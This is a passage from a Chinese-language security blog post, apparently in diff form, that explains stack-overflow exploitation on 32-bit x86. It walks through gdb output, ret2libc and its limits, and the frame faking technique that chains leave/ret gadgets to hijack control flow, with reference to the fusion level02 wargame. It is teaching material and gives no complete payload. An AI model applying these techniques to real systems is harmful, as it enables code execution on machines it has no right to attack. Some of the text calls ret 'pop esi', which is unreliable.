class="number">0x804844b</span>	<span class="number">0x804844b</span> &lt;t&gt;</span><br><span class="line">eflags         <span class="number">0x296</span>	[ PF AF SF IF ]</span><br><span class="line"><span class="literal">cs</span>             <span class="number">0x73</span>	<span class="number">115</span></span><br><span class="line"><span class="literal">ss</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">ds</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">es</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">fs</span>             <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">gs</span>             <span class="number">0x33</span>	<span class="number">51</span></span><br></pre></td></tr></table></figure>
+<p>步进之后果然进入了t函数。查看t函数的汇编代码。</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas t</span><br><span class="line">Dump <span class="keyword">of</span> assembler code <span class="keyword">for</span> <span class="keyword">function</span> t:</span><br><span class="line">=&gt; <span class="number">0x0804844b</span> &lt;+<span class="number">0</span>&gt;:	push   <span class="decorator">%ebp</span></span><br><span class="line">   <span class="number">0x0804844c</span> &lt;+<span class="number">1</span>&gt;:	mov    <span class="decorator">%esp</span>,<span class="decorator">%ebp</span></span><br><span class="line">   <span class="number">0x0804844e</span> &lt;+<span class="number">3</span>&gt;:	sub    <span class="variable">$0x28</span>,<span class="decorator">%esp</span></span><br><span class="line">   <span class="number">0x08048451</span> &lt;+<span class="number">6</span>&gt;:	movl   <span class="variable">$0x0</span>,-<span class="number">0xc</span>(<span class="decorator">%ebp</span>)</span><br><span class="line">   <span class="number">0x08048458</span> &lt;+<span class="number">13</span>&gt;:	addl   <span class="variable">$0x1</span>,-<span class="number">0xc</span>(<span class="decorator">%ebp</span>)</span><br><span class="line">   <span class="number">0x0804845c</span> &lt;+<span class="number">17</span>&gt;:	mov    <span class="variable">$0x804857c</span>,<span class="decorator">%eax</span></span><br><span class="line">   <span class="number">0x08048461</span> &lt;+<span class="number">22</span>&gt;:	mov    -<span class="number">0xc</span>(<span class="decorator">%ebp</span>),<span class="decorator">%edx</span></span><br><span class="line">   <span class="number">0x08048464</span> &lt;+<span class="number">25</span>&gt;:	mov    <span class="decorator">%edx</span>,<span class="number">0x4</span>(<span class="decorator">%esp</span>)</span><br><span class="line">   <span class="number">0x08048468</span> &lt;+<span class="number">29</span>&gt;:	mov    <span class="decorator">%eax</span>,(<span class="decorator">%esp</span>)</span><br><span class="line">   <span class="number">0x0804846b</span> &lt;+<span class="number">32</span>&gt;:	call   <span class="number">0x8048320</span> &lt;printf@plt&gt;</span><br><span class="line">   <span class="number">0x08048470</span> &lt;+<span class="number">37</span>&gt;:	leave  </span><br><span class="line">   <span class="number">0x08048471</span> &lt;+<span class="number">38</span>&gt;:	ret    </span><br><span class="line">End <span class="keyword">of</span> assembler dump.</span><br></pre></td></tr></table></figure>
+<p>此时ebp为0x41414141。esp为0xbffff650,该地址的内存中存储的值为CCCC。</p>
+<p>所以在代码执行t函数的栈空间构造完成之后。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:right">寄存器</th>
+<th style="text-align:left">值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:right">[0xbffff64c]ebp====&gt;</td>
+<td style="text-align:left">0x41414141</td>
+</tr>
+<tr>
+<td style="text-align:right"></td>
+<td style="text-align:left">0x43434343</td>
+</tr>
+<tr>
+<td style="text-align:right"></td>
+<td style="text-align:left">…..</td>
+</tr>
+<tr>
+<td style="text-align:right"></td>
+<td style="text-align:left">…..</td>
+</tr>
+<tr>
+<td style="text-align:right">[0xbffff624]esp====&gt;</td>
+<td style="text-align:left">0x0804857c[这个值是什么不重要]</td>
+</tr>
+</tbody>
+</table>
+<p>在leave执行之后。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:right">寄存器</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:right"></td>
+<td>0x41414141</td>
+</tr>
+<tr>
+<td style="text-align:right">[0xbffff650]esp====&gt;</td>
+<td>0x43434343</td>
+</tr>
+<tr>
+<td style="text-align:right"></td>
+<td>…</td>
+</tr>
+<tr>
+<td style="text-align:right"></td>
+<td>…</td>
+</tr>
+<tr>
+<td style="text-align:right"></td>
+<td>…</td>
+</tr>
+<tr>
+<td style="text-align:right"></td>
+<td>…</td>
+</tr>
+<tr>
+<td style="text-align:right"></td>
+<td>…</td>
+</tr>
+<tr>
+<td style="text-align:right">[0x41414141]ebp====&gt;</td>
+<td>不关心是什么东西…………………………..</td>
+</tr>
+</tbody>
+</table>
+<p>再执行ret。其实就是pop esi,那么esi就指向了esp当前指向的0x43434343。</p>
+<p>那么同理，函数的参数其实就很好理解了。</p>
+<h2 id="缺点与不足">缺点与不足</h2><p>这种溢出技巧有两个缺点：</p>
+<ol>
+<li>不能很好的支持连续调用多个函数，因为每个函数需要的参数可能不同。</li>
+<li>不能支持参数中出现null字符。</li>
+</ol>
+<p>所以我们需要引入一个高级一些的技巧：）。</p>
+<h1 id="0x02_frame_faking"><strong>0x02</strong> frame faking</h1><h2 id="原理介绍">原理介绍</h2><p>frame faking并不是通过覆盖ret地址为目标函数来控制eip，而是通过覆盖ebp与eip协同来控制程序的进程。</p>
+<p>首先给出frame faking技巧使用时栈上的内存分布，之后在做详细的分步解释。</p>
+<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-栈上数据图.png" alt="stack status"></p>
+<p>如图所示，给出的payload中做了两件事情。</p>
+<ol>
+<li><p>用一个<strong>伪造的EBP地址</strong>来<strong>覆盖</strong>原来的<strong>真实的EBP地址</strong>。</p>
+</li>
+<li><p>用一个指向汇编代码<strong>leave/ret</strong>的地址覆盖原来的返回地址。这么一来在原本程序结束前调用函数中原本存在的leave/ret指令之后，会再一次执行leave/ret指令。相当于做了两次leave/ret。可以变向的理解为<strong>被攻击的函数</strong>结束时的汇编代码为。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line">sub esp, <span class="number">0x96</span> </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">mov esp,ebp			;<span class="comment">//</span></span><br><span class="line">pop ebp				;<span class="comment">// leave</span></span><br><span class="line"></span><br><span class="line">pop esi				;<span class="comment">// ret</span></span><br><span class="line"></span><br><span class="line">mov esp,ebp			;<span class="comment">//</span></span><br><span class="line">pop ebp				;<span class="comment">// leave</span></span><br><span class="line"></span><br><span class="line">pop esi				;<span class="comment">// ret</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>现在对两次leave/ret做出拆分图解，一共6条汇编指令。</p>
+<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-leave1-mov_esp_ebp.png" alt="leave_1_mov_esp_ebp"></p>
+<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-leave1-pop_ebp.png" alt="leave_1_pop_ebp"></p>
+<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-ret1-pop_eip.png" alt="ret_1_pop_eip"></p>
+<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-leave2-mov_esp_ebp.png" alt="leave_2_mov_esp_ebp"></p>
+<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-leave2-pop_ebp.png" alt="leave_2_pop_ebp"></p>
+<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-ret2-pop_eip.png" alt="ret_2_pop_eip"></p>
+<p>通过这一系列的调用，完成了程序运行流程的控制，在解决fusion的level02的时候使用这个技巧可以使解题变的简单很多。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/01/27/frame-faking/">frame-faking-介绍-函数调用伪造</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 mrh 的个人博客">mrh</a></p>
+        <p><span>发布时间:</span>2016年01月27日 - 11时02分</p>
+        <p><span>最后更新:</span>2016年03月23日 - 23时35分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/01/27/frame-faking/" title="frame-faking-介绍-函数调用伪造">http://yoursite.com/2016/01/27/frame-faking/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2016/01/27/frame-faking/　　作者: mrh" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2016/02/09/CVE-2016-1879调试&分析/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          CVE-2016-1879 调试&amp;分析
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2015/12/14/protostar-heap3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00_frame-faking"><span class="toc-number">1.</span> <span class="toc-text">0x00  frame-faking</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#<!-more->"><span class="toc-number">1.1.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01_经典的ret2lib溢出"><span class="toc-number">2.</span> <span class="toc-text">0x01 经典的ret2lib溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#溢出流程"><span class="toc-number">2.1.</span> <span class="toc-text">溢出流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#缺点与不足"><span class="toc-number">2.2.</span> <span class="toc-text">缺点与不足</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02_frame_faking"><span class="toc-number">3.</span> <span class="toc-text">0x02 frame faking</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理介绍"><span class="toc-number">3.1.</span> <span class="toc-text">原理介绍</span></a></li></ol></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/02/09/CVE-2016-1879调试&分析/" title="上一篇: CVE-2016-1879 调试&amp;分析">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2015/12/14/protostar-heap3/" title="下一篇: protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/04/29/CVE-2016-1749内核代码执行POC分析/">CVE-2016-1749内核代码执行POC分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/19/CVE-2016-1757利用程序分析/">CVE-2016-1757利用程序分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/18/apple沙盒研究之基础知识/">apple沙盒研究之基础知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/13/利用patch绕过kextload对内核签名的检测/">利用patch绕过kextload对内核签名的检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/03/CVE-2016-1757简单分析/">CVE-2016-1757简单分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/30/OSX内核加载mach-o流程分析/">OSX内核加载mach-o流程分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/22/fishhook源码分析/">fishhook源码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/16/dyld源码分析load/">dyld源码分析-动态加载load</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/10/Mach-O的动态链接/">Mach-O的动态链接相关知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/mach-o文件格式分析/">mach-o格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/03/CVE-2016-0799简单分析/">CVE-2016-0799简单分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/01/dyld中macho加载的简单分析/">dyld中mach-o文件加载的简单分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/29/OS-X-内核研究-基础知识/">OS X 内核研究 准备知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/23/通过fusion level02浅谈exploit中的函数调用伪造/">通过fusion level02浅谈exploit中的函数调用伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/19/CVE-2015-7547分析与调试/">对CVE-2015-7547简单的分析与调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/09/CVE-2016-1879调试&分析/">CVE-2016-1879 调试&分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/01/27/frame-faking/">frame-faking-介绍-函数调用伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/14/protostar-heap3/">protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/12/图解DWORDSHOOT/">图解DWORDSHOOT</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/09/protostar-heap2/">protostar详细解析 heap2 解答</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/09/protostar-heap1/">protostar详细解析 heap1 解答</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/04/栈溢出练习小结/">wargame简单入门</a></li></ul>
+    <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2016 mrh
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >本站到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
+<script src="/js/main.js" type="text/javascript"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 21;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-71141416-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+  </div>
+</body>
+</html>
